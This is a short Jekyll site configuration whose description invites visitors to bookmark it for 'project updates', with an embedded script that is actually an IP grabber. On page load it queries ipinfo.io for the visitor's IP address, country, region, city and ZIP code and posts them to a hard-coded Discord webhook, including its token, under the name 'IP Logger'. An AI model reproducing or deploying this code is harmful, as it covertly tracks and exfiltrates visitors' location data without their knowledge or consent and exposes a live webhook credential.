theme: jekyll-theme-minimal
title: Lil shithead
description: Bookmark this to keep an eye on my project updates!
<script>
function monke(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "https://discord.com/api/webhooks/1335667587572432947/OUk616TFNWUOlLMNvwkRI9-7d4LoD5pXpzFTfSrTPe5e-GWpAwNWkCsug2djmJzKBJbG");

     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "IP Logger",
          avatar_url: "",
          content: "@everyone",
          embeds: [
               {
                    title: "Someone visited the IP grabber!",
                    color: 1752220,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}
</script>
<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
